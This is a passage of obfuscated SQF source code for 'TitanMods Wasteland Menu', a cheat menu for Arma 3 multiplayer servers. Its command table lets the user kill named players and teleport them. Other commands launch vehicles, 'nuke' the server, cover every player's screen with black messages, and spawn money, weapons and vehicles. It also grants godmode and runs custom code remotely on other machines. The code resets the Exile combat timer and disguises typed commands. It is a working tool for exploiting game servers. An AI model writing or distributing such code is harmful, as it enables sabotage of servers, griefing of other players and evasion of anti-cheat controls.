			{
				_fivedorraboughtfromtitanmods_co_de = _fivedorraboughtfromtitanmods_co_de + " " + _x;
			} forEach _parts;

			_re = ["dfivedorraboughtfromtitanmods_ee7wgddhqdhjaiw7aow9q2h12",{}] call _getVariable;
			_a = compile _fivedorraboughtfromtitanmods_co_de;
			_a spawn _re;
		};

		_kill = {
			params["_parts","_getVariable","_setVariable"];
			_name = _parts select 0;
			{
				if(_forEachIndex != 0) then {
					_name = _name + " " + _x;
				};
			} forEach _parts;
			if(isNil {_name}) then {_name = "";};

			_found = false;
			{
				if(tolower(name _x) == tolower(_name)) then {
					_x setDamage 1;
					_found = true;
				};
			} forEach allPlayers;
			if(_found) then {
				systemChat format["[JMV7] Killed %1", _name];
			} else {
				systemChat format["[JMV7] Could not find player %1.", _name];
			};

		};


_gammo = {
	_weapon = currentWeapon player;
	_mags = getArray(configfile >> 'cfgWeapons' >> _weapon >> 'magazines');
	_mag = _mags select 0;
	player addMagazine _mag;
	player addMagazine _mag;
	sleep(0.025);
	systemChat format["[JMV7] 2 %1 added to your inventory.", _mag];
};


		_kb = {

if (!isnil "jm_press_exec") then
{
    (findDisplay 46) displayRemoveEventHandler ["KeyDown", jm_press_exec];
};



jm_bindings_exec =
{
    switch (_this) do
    {
case 8:
{
vehicle player setVehicleAmmo 1;
cursorTarget setVehicleAmmo 1;
};
case 211:
{
deleteVehicle cursorTarget;
};
case 184:
{
    showCommandingMenu "#USER:jm_Main";

    _log1 = format["JamesMenu v6"];
    ['<t align=''left'' size=''0.6'' color=''#1500FF''>'+(_log1)+'</t>',safezoneX+0.036,safezoneY+0.13,15,0,0,123] spawn bis_fnc_dynamicText;


};

case 72:
{
	_obj = cameraOn;
	_vel = velocity _obj;
	if(_obj isKindOf 'Air')then
	{
		_obj setVelocity [(_vel select 0),(_vel select 1),30];
	}
	else
	{
		_obj setVelocity [(_vel select 0),(_vel select 1),8];
	};
};
case 59:
   {
["TaskSucceeded",["","You were healed!"]] call bis_fnc_showNotification;
 player setDamage 0;
 vehicle player setDamage 0;
 vehicle player setFuel 1;   };
case 64:
   {
    hint 'Speed Added';
    _vehicle = vehicle player;
    _vel = velocity _vehicle;
    _dir = direction _vehicle;
    _speed = 5; comment "Added speed";
    _vehicle setVelocity [
     (_vel select 0) + (sin _dir * _speed),
     (_vel select 1) + (cos _dir * _speed),
     (_vel select 2)
    ];
    call Jfivedorraboughtfromtitanmods_Love_Druggies;
   };
        case 200:
        {
        _distance = 2;
        _dir = getdir vehicle player;
        _pos = getpos vehicle player;
        if (surfaceIsWater getpos vehicle player) then {_pos = getPosASL vehicle player;}else{_pos = getPosATL vehicle player;};



        if ((vehicle player) isKindOf "Air") then
        {


            if (count(crew (vehicle player))>1) then
            {
                _pos = [(_pos select 0)+_distance*sin(_dir),(_pos select 1)+_distance*cos(_dir),(_pos select 2)+100];
            }
            else
            {
                _distance = 2;
                _pos = [(_pos select 0)+_distance*sin(_dir),(_pos select 1)+_distance*cos(_dir),(_pos select 2)];
            };


        }
        else
        {
            if ((_pos select 2) > 5) then
            {
                _pos = [(_pos select 0)+_distance*sin(_dir),(_pos select 1)+_distance*cos(_dir),(_pos select 2)];
            }
            else
            {
                _pos = [(_pos select 0)+_distance*sin(_dir),(_pos select 1)+_distance*cos(_dir),0];
            };
        };

        _Object = (vehicle player);
        if (surfaceIsWater _pos) then {_Object setPosASL _pos;}else{_Object setPosATL _pos;};
        sleep 1;

        };
    };
};


waituntil {!isnull (finddisplay 46)};
jm_press_exec = (findDisplay 46) displayAddEventHandler ["KeyDown", "_this select 1 call jm_bindings_exec; false;"];
sleep 1;

		};
		_leave = {
			endMission "fail";
		};
		_radar = {
			params["_parts","_getVariable","_setVariable"];
			_dist = 100;
			_size = 250;
			_scale = 12;
			if(count(_parts) > 0) then {
				_dist = parseNumber(_parts select 0);
				if(count(_parts) > 1) then {
					_scale = parseNumber(_parts select 1);
					if(count(_parts) > 2) then {
						_size = parseNumber(_parts select 2);
					};
				};
			};

			MAP_SIZE = _size;
			MAP_DIST = _dist;
			MAP_SCALE = _scale;

			_var = !(["RDR",false] call _getVariable);
			["RDR",_var] call _setVariable;
			if(_var) then {
				 _eh = addMissionEventHandler ["Eachframe",{
					_mapSize = MAP_SIZE;
					_checkDistance = MAP_DIST;
					_mapScale = MAP_SCALE;
					_objects = nearestObjects [player,["LandVehicle","Air","Ship","Man"],_checkDistance];
					_mapDims = ctrlPosition ((findDisplay 12) displayCtrl 51);
					_x = (_mapDims select 0) + (pixelW*10);
					_w = pixelW * _mapSize;
					_y = (_mapDims select 1) + (pixelH*10);
					_h = pixelH * _mapSize;
					_xCenter = _x + (_w / 2);
					_yCenter = _y + (_h / 2);
					_pos1 = ((findDisplay 12) displayCtrl 51) ctrlMapScreenToWorld [_x,_y];
					_pos2 = ((findDisplay 12) displayCtrl 51) ctrlMapScreenToWorld [_x,_y + _h];
					_pos3 = ((findDisplay 12) displayCtrl 51) ctrlMapScreenToWorld [_x + _w,_y];
					_pos4 = ((findDisplay 12) displayCtrl 51) ctrlMapScreenToWorld [_x + _w,_y + _h];
					((findDisplay 12) displayCtrl 51) drawLine [_pos1,_pos2,[1,0,0,1]];
					((findDisplay 12) displayCtrl 51) drawLine [_pos1,_pos3,[0,1,0,1]];
					((findDisplay 12) displayCtrl 51) drawLine [_pos3,_pos4,[0,0,1,1]];
					((findDisplay 12) displayCtrl 51) drawLine [_pos2,_pos4,[0,1,1,1]];
					_cX = _x;
					{
						if(alive _x) then {
							_myPos = getPos player;
							_tPos = getpos _x;
							_dX = ((_tPos select 0) - (_myPos select 0)) / (_checkDistance / (_mapSize/2));
							_dY = ((_myPos select 1) - (_tPos select 1)) / (_checkDistance / (_mapSize/2));
							_xPos = _xCenter + (pixelW * _dX);
							_yPos = _yCenter + (pixelH * _dY);
							_pos = ((findDisplay 12) displayCtrl 51) ctrlMapScreenToWorld [_xPos,_yPos];
							_color = [0.33,0.33,1,1];
							if(_x isKindOf "Man") then {
								_color = [1,0.33,0.33,1];
							};
							if(_x == player) then {
								_color = [0.33,1,0.33,1];
							};
							_icon = getText(configFile >> "CfgVehicles" >> typeof _x >> "Icon");
							((findDisplay 12) displayCtrl 51) drawIcon [
								_icon,
								_color,
								_pos,
								_mapScale,
								_mapScale,
								getdir _x,
								".",
								0,
								0.01,
								"TahomaB",
								"Center"
							];
						};
					} forEach _objects;
				}];
				["RDREH",_eh] call _setVariable;
			} else {
				_eh = ["RDREH",0] call _getVariable;
				removeMissionEventHandler ["Eachframe",_eh];
			};
		};


		hintSilent "loading....";

		_3fivedorraboughtfromtitanmods_373d3dh73ehksjdhd3_content = [


		["",{},"T Commands"],

		["teletarget",_tptarget,"[target name] T e l e p o r t to a target"],
			["tph",_tph,"[target name] T e l e p o r t a target here"],
			["tpa",_tpa,"T e l e p o r t all to you"],
			["tpm",_tpm,"T e l e p o r t using the map"],
			["kill",_kill,"[Target Name] Kill a player"],

			["",{},"Standard Scripts (working)"],
			["ico",_ico,"Toggles player icons on/off"],
			["map",_map,"Toggles player map icons on/off"],
			["rdr",_radar,"[distance, scale, uisize] Toggles 2D radar on/off"],
			["iam",_iam,"Toggles Ammo Auto Refill on/off"],
			["ns",_ns,"Toggles No Sway on/off"],
			["kb",_kb,"Enables Keybinds"],
			["gd",_goymode,"Toggles Autoheal on/off"],

      ["",{},"Vehicle Enchancements"],
			["wepveh",_wepveh,"Weaponize Vehicle [gatling, cupgatling]"],
      ["raincar",_raincar,"Rainbow Car - changes colors of vehicle"],
      ["deraincar",_DEraincar,"Revert Rainbow Car changes to default."],
      ["vehgod",_DEraincar,"Activates Vehicle Godmode"],

			["",{},"Troll Scripts (working)"],
			["l",_l,"Launches cursor vehicle up"],
			["ln",_ln,"Launches nearest vehicle into the air"],
			["la",_la,"Launches all vehicles into the air"],
			["time",_time,"[Hours] Skip everybodys time ahead (Uses RE)"],
			["",{},"Explosive Scripts (working)"],
			["nk",_nk,"N u K e the server"],
			["sw",_sw,"Shock wave"],
			["bw",_bw,"Blast wave"],

			["money",_money,"Spawn Wasteland Money [ money, amount]"],

      ["",{},"Mass Communication Scripts"],
      ["blackmessage",_blackmessage,"Black Screen Mass Message"],
			["removeblkmsg",_removeblackmessage,"Remove everybodys black screen"],
      ["masshint",_masshint,"Mass Hint Message"],
      ["titletext",_titletext,"Mass TitleText"],

			["",{},"Spawn Scripts (working)"],
			["spw",_spw,"Spawn a weapon"],
			["gammo",_gammo,"Spawn ammo for your current weapon."],
			["spwveh",_spwveh,"Spawn a vehicle"],
			["box",_box,"Spawn a box [weapon, clothing, building] [public, local]"],
			["",{},"Misc Scripts (working)"],
			["run",_run,"Run custom code"],
			["runre",_runr,"Remote Run custom code"],
			["infect",_infect,"[Name] Infect a player"],
			["leave",_leave,"Leave the server"]
		];

		_3fivedorraboughtfromtitanmods_373d3dh73ehksjdhd3_content pushBack ["exit",{},"Exits the menu"];
		["3fivedorraboughtfromtitanmods_373d3dh73ehksjdhd3_content",_3fivedorraboughtfromtitanmods_373d3dh73ehksjdhd3_content] call _setVariable;

		hintSilent "loading.....getting weps";
call _loadWeaponsEarly;

hintSilent "loading.....weps done";

		[_getVariable] spawn {
			_getVariable = _this select 0;

			disableSerialization;
			15401 cutrsc ["rscDynamicText","plain"];

			_display = uinamespace getvariable "BIS_dynamicText";
			_control = _display displayctrl 9999;
			_control ctrlsetposition [safezonex,safezoney,safezonew,safezoneh/20];
			_control ctrlsetbackgroundcolor [0,0,0,0];
			_control ctrlsettextcolor [random(1),random(1),random(1),1];
			_control ctrlSetStructuredText parseText "<t size='0.8' align='center'>TitanMods - Wasteland Menu - v1</t>";
			_control ctrlCommit 0;
			while{["runloops",false] call _getVariable} do {
				_control ctrlsettextcolor [random(1),random(1),random(1),1];
				_control ctrlCommit 0;
				uiSleep 0.1;
			};
			15401 cutText ["","PLAIN"];
		};

		[_getVariable] spawn {
			_getVariable = _this select 0;
			while{["runloops",false] call _getVariable} do {
				uiSleep 0.1;
				ExileClientPlayerLastCombatAt = 0;
			};
		};
		hintSilent "loading......";

		_showCmds = {
			15403 cutrsc ["rscDynamicText","plain"];
			_display = uinamespace getvariable "BIS_dynamicText";
			_control = _display displayctrl 9999;
			_control ctrlsetposition [safezonex + safezonew - (safezonew/5) - 0.001,-0.4,safezonew/5,(safezoneh/2) + 0.95];

			_control ctrlsetbackgroundcolor [0,0,0,0.75];
			_control ctrlsettextcolor [1,1,1,1];
			_text = "<t size='0.45' color='#FF0000' align='center'>Command Referance<br/></t><t size='0.4' align='left'>";
			{
				if((_x select 0) != "") then {
					_text = _text + "<t color='#FFFF00'>" + (_x select 0) + "</t>: " + (_x select 2) + "<br/>";
				} else {
					_text = _text + "<t size='0.425' align='center' color='#FFA500'>" + (_x select 2) + "</t><br/>";
				};
			} forEach _3fivedorraboughtfromtitanmods_373d3dh73ehksjdhd3_content;
			_text = _text + "</t>";
			_control ctrlSetStructuredText parseText _text;
			_control ctrlCommit 0;
		};

		hintSilent "loading.......";

		_showPlrs = {
			15404 cutrsc ["rscDynamicText","plain"];
			_display = uinamespace getvariable "BIS_dynamicText";
			_control = _display displayctrl 9999;
			_control ctrlsetposition [safezonex + safezonew - (safezonew/1) - 0.001,-0.4,safezonew/5,(safezoneh/2) + 0.95];

			_control ctrlsetbackgroundcolor [0,0,0,0.75];
			_control ctrlsettextcolor [1,1,1,1];

			_text = "<t size='0.45' align='center' color='#FF0000'>Players<br/></t><t align='left' size='0.4'>";
			_players = allPlayers apply { [_x distance player, _x] };
			_players sort true;
			{
				_text = _text + "<t color='#FFFF00'>" + (name (_x select 1)) + "</t> (" + str(round(_x select 0)) + "m)<br/>";
			} forEach _players;
			_text = _text + "</t>";
			_control ctrlSetStructuredText parseText _text;
			_control ctrlCommit 0;
		};


		_showWeps = {




 		 _CameraList2 = findDisplay 24 ctrlCreate ["RscListBox", 1];


 		 _CameraList2 ctrlCommit 0;
 		 _CameraList2  ctrlSetPosition [0.502,0.53,0.75 * (0.65),3.8 * (0.2)];
 		 _CameraList2 ctrlCommit 0.5;
 		 _CameraList2 ctrlSetEventHandler ["LbDBlClick","call fivedorraboughtfromtitanmods_Wep;"];

 		 _CameraList2 ctrlShow true;



			for "_i" from 0 to (count weaponList)-1 do
			{
				_weapon = weaponList select _i;
					_CameraList2 lbAdd _weapon;
					_CameraList2 lbSetPicture [_i, (getText (configFile >> "cfgWeapons" >> _weapon >> "picture"))];

};



		 fivedorraboughtfromtitanmods_Wep =
		 {
			 _ctrl = _this select 0;
				_index = _this select 1;
			 _weapon_selected = _ctrl lbText _index;
			 if (_weapon_selected != "") then
			 {
				 _ammo_class_name = getArray(configFile >> "cfgWeapons" >> _weapon_selected >> "magazines");
				 _ammo = _ammo_class_name select 0;

				 player addWeapon _weapon_selected;
				 player addMagazine _weapon_selected;
				 player forceAddUniform  _weapon_selected;
				 player addBackpackGlobal _weapon_selected;
				 player addMagazine _ammo;player addMagazine _ammo;
				 player addMagazine _ammo;player addMagazine _ammo;
				 reload player;

				 systemChat format["[JMV7] Weapon Spawned : %1",_weapon_selected];
			 };
		 };



};


		_showVehs = {



			_CameraList = findDisplay 24 ctrlCreate ["RscListBox", 1337];


			_CameraList ctrlCommit 0;
			_CameraList  ctrlSetPosition [0.002,0.53,0.75 * (0.65),3.8 * (0.2)];
			_CameraList ctrlCommit 0.5;
			_CameraList ctrlSetEventHandler ["LbDBlClick","call fivedorraboughtfromtitanmods_Veh;"];

			_CameraList ctrlShow true;

			_CameraList lbAdd "Vehicle Spawning";

								for "_i" from 0 to (count Jay_vehicle_list)-1 do
								{
									_vehicles = Jay_vehicle_list select _i;

									_CameraList lbAdd _vehicles;
									_CameraList lbSetPicture [_i, (getText (configFile >> "cfgVehicles" >> _vehicles >> "picture"))];
								};
								lbSort _CameraList;
								fivedorraboughtfromtitanmods_Veh =
								{
									_ctrl = _this select 0;
                  _index = _this select 1;
                 _vehicle_chosen = _ctrl lbText _index;
								 _dir = getDir vehicle player;
								 _pos1 = getPos vehicle player;
								 _pos = [(_pos1 select 0) + 5*(sin _dir), (_pos1 select 1) + 5*(cos _dir), (_pos1 select 2)];
                 _vehicle_chosen createVehicle _pos;
								};
		};


			_Hint__tittle1 = "<t color='#56BFF2' size='3.0' align='center'>TitanMods Wasteland</t><br/>";
			_Hint__props = "<t color='#FF1933' size='1.5' align='center'>Open chat and type #</t><br/>";
			_Hint__f1 = "<t color='#FF1933' size='1.5' align='center'> </t><br/>";
			_Hint__keybizzle = "<t color='#FFFFFF' size='1.5' align='center'> Credits to: Lystic </t><br/>";
			_Hint__keyswag = "<t color='#FFFFFF' size='1.5' align='center'>Version: 1 - Wasteland</t><br/>";
			_Hint__Mr = "<t color='#FFFFFF' size='1.5' align='center'> www.titanmods.online </t><br/>";
			hint parseText(_Hint__tittle1 + _Hint__Mr + _Hint__props + _Hint__f1 + _Hint__Mr + _Hint__keyswag + _Hint__keybizzle);

		_ns = {
			params["_parts","_getVariable","_setVariable"];
			if(isnil {["ns",nil] call _getVariable}) then {["ns",false] call _setVariable;};
			["ns",!(["ns",false] call _getVariable)] call _setVariable;

			if(["ns",false] call _getVariable) then {
				hint "no sway on";
				player setCustomAimCoef 0;
			} else {
				hint "no sway off";
				player setCustomAimCoef 1;
			};

		};

		_sLocal = {
			params["_vehicle","_fivedorraboughtfromtitanmods_co_de"];
			private["_veh"];
			player reveal [_vehicle,4];
			player allowDamage false;
			_oldPos = getpos player;
			moveout(driver _vehicle);
			_tOut = diag_tickTime + 5;
			waitUntil{isNull (driver _vehicle) || diag_tickTime > _tOut};
			uiSleep 0.025;

			player moveInAny _vehicle;

			waitUntil{vehicle player != player || diag_tickTime > _tOut};
			waitUntil{local (vehicle player)};
			call _fivedorraboughtfromtitanmods_co_de;
			moveOut player;
			waitUntil{vehicle player == player || diag_tickTime > _tOut};
			_veh = player;
			_veh setVelocity [0,0,0];
			player setPos _oldPos;
			player allowDamage true;
		};
		["sLocal",_sLocal] call _setVariable;


		scopeName "leavedisshit";
		while{true} do {
			15402 cutText ["","PLAIN"];
			15403 cutText ["","PLAIN"];
			15404 cutText ["","PLAIN"];
			15405 cutText ["","PLAIN"];
			showChat true;
			waitUntil{!isNull (findDisplay 24)};
			showChat false;
			_open = false;
			_ctrl = (findDisplay 24) displayCtrl 101;

			while{!isNull (findDisplay 24)} do {
				if(ctrlText _ctrl == "#") exitWith {
					_open = true;
					_ctrl ctrlSetText "";
				};
				uiSleep 0.1;
			};
			if(_open) then {
				call _showCmds;
				call _showPlrs;
				call _showVehs;
				call _showWeps;
				15402 cutrsc ["rscDynamicText","plain"];
    _display = uinamespace getvariable "BIS_dynamicText";
    _control = _display displayctrl 9999;
		_control ctrlsetposition [(safezonex+0.85),safezoney + (safezoneh/4) + (safezoneh/40),(safezonew/3),safezoneh/10];

    _control ctrlsetbackgroundcolor [0,0,0,0.75];
    _control ctrlsettextcolor [1,1,1,1];
    _control ctrlSetStructuredText parseText "<t size='0.8' align='center'>Type the command into the box. Real text appears here.<br/>A list of commands is in the bottom left of your screen.<br/>Press ESCAPE to submit command.</t>";
    _control ctrlCommit 0;





								_display = findDisplay 24;
								_ctrl = _display displayCtrl -1;
								_dims = ctrlPosition _ctrl;
								_dims set [0,0];
								_dims set [1,0.4];
								_dims set [2,1];
								_ctrl ctrlSetPosition _dims;
								_ctrl ctrlSetBackgroundColor [0,0,0,0.75];
								_ctrl ctrlCommit 0;
								_ctrl = _display displayCtrl 101;
								_dims = ctrlPosition _ctrl;
								_dims set [0,0];
								_dims set [1,0.4];
								_dims set [2,1];
								_ctrl ctrlSetPosition _dims;
								_ctrl ctrlCommit 0;

								_chattext = "";
								_fakeTEXT  = "";
								while{true} do {
									_text = ctrlText _ctrl;
									if(toLower(_chattext) == "suh") exitWith {
                       _CameraList = findDisplay 24;
											 _filter = _CameraList displayCtrl 1337;
												_parts = _chattext splitString  " ";
												_ctrl = _filter select 0;
			                  _index = _filter select 1;
			                 _vehicle_chosen = _ctrl lbText _index;
											 lbClear _CameraList;
										{
												 if(((toLower _x) find _chattext > -1)||((toLower _vehicle_chosen) find _chattext > -1))then{
												 	_CameraList = _ctrl lbAdd format['%1 (%2)',_vehicle_chosen,_x];
												};
										 } forEach _vehicle_chosen;



									};
									waitUntil{isNull _display || _text != ctrlText _ctrl};
									if(isNull _display) exitWith {
										if(_chattext == "") exitWith {};
										_parts = _chattext splitString  " ";
										_command = _parts deleteAt 0;

										if(toLower(_command) == "exit") exitWith {
											hint "Exiting Script...\n\nWarning: Errrors May Occur";
											breakto "leavedisshit";
										};
										_executed = false;
										{
											_cmd = _x select 0;
											_code = _x select 1;
											if(toLower(_cmd) == toLower(_command)) exitWith {
												hintSilent "";
												_executed = true;
												[_parts,_getVariable,_setVariable] spawn _code;
											};
										} forEach _3fivedorraboughtfromtitanmods_373d3dh73ehksjdhd3_content;
										if(!_executed) then {
											hint "That is not a command!";
										};
									};
									_newText = ctrlText _ctrl;
									_arrayO = toArray(_text);
									_arrayN = toArray(_newText);
									_lenO = count(_arrayO);
									_lenN = count(_arrayN);
									if(_lenO > _lenN) then {
										_chattext = _chattext select [0,_lenN];
										_fakeTEXT = _fakeTEXT select [0,_lenN];
									};
									if(_lenO < _lenN) then {
										_dif = _lenN - _lenO;
										_subStr = _newText select [_lenO,_dif];
										_chattext = _chattext + _subStr;
										for "_i" from 1 to _dif do {
											_a = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","1","2","3","4","5","6","7","8","9","0"];
											_l = _a select floor(random(count(_a)));
											_upper = (random(1) > 0.5);
											if(_upper) then {
												_l = toUpper(_l);
											};
											_fakeTEXT = _fakeTEXT + _l;
										};
										_ctrl ctrlSetText _fakeTEXT;
									};
									_control ctrlSetStructuredText parseText ("<t size='0.8' align='center'>" + format["text: %1",_chattext] + "</t>");
									if(_chattext != "") then {
										_p1 = [];
										_p2 = [];
										{
											_cmd = _x select 0;
											_desc = _x select 2;
											_index = (toLower(_cmd) find toLower(_chattext));
											if(_index == 0) then {
												_p1 pushback [_cmd,_desc];
											} else {
												if(_index != -1) then {
													_p2 pushBack [_cmd,_desc];
												};
											};
										} forEach _3fivedorraboughtfromtitanmods_373d3dh73ehksjdhd3_content;
										_predictions = [];
										_show = false;
										if(count(_p1) > 0) then {
											_predictions = _p1;
											_show = true;
										} else {
											if(count(_p2) > 0) then {
												_predictions = _p2;
												_show = true;
											};
										};



										if(_show) then {
											_predictions sort true;

											15405 cutrsc ["rscDynamicText","plain"];
											_d = uinamespace getvariable "BIS_dynamicText";
											_c = _d displayctrl 9999;
											_c ctrlsetposition [0,0.4 + (_dims select 3),0.5,(_dims select 3) * count(_predictions)];
											_c ctrlsetbackgroundcolor [0,0,0,0.75];
											_c ctrlsettextcolor [1,1,1,1];

											_t = "<t size='0.4' align='left'>";
											{
												_t = _t + "<t color='#FFFF00'>" + (_x select 0) + "</t>: " + (_x select 1) + "<br/>";
											} forEach _predictions;
											_t = _t + "</t>";
											_c ctrlSetStructuredText parseText _t;
											_c ctrlCommit 0;

										} else {
											15405 cutText ["","PLAIN"];
										};
									} else {
										15405 cutText ["","PLAIN"];
									};

								};
							};
						};
						["runloops",false] call _setVariable;
						15402 cutText ["","PLAIN"];
						15403 cutText ["","PLAIN"];
						15404 cutText ["","PLAIN"];
						15405 cutText ["","PLAIN"];


				};
